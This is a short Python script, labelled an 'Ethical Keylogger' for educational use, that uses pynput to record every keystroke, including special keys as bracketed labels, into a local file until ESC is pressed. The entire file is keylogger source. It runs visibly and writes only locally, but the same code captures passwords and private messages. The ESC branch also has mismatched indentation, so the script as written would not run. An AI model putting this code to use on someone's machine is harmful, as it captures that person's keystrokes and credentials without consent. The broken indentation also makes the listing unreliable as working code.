from pynput import keyboard

def keyPressed(key): #on_press automatically passes key, do not need to define it
    if key == keyboard.Key.esc:
         print("[Keylogger] ESC pressed. Stopping listener.")
        return False # This stops the background listener
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(" ")    
            elif key == keyboard.Key.enter:
                logKey.write("\n")
            else:
                # 3. Use .name to get a readable label (e.g., [SHIFT])
                logKey.write(f" [{key.name.upper()}] ")

if __name__ == "__main__":
    print("=" * 50)
    print("  Ethical Keylogger — Educational Use Only")
    print("  Logging to: keyfile.txt")
    print("  Press ESC to stop.")
    print("=" * 50)

    # Start listening for key presses in a background thread
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()

    print("[Keylogger] Session ended. Keystrokes saved to keyfile.txt")
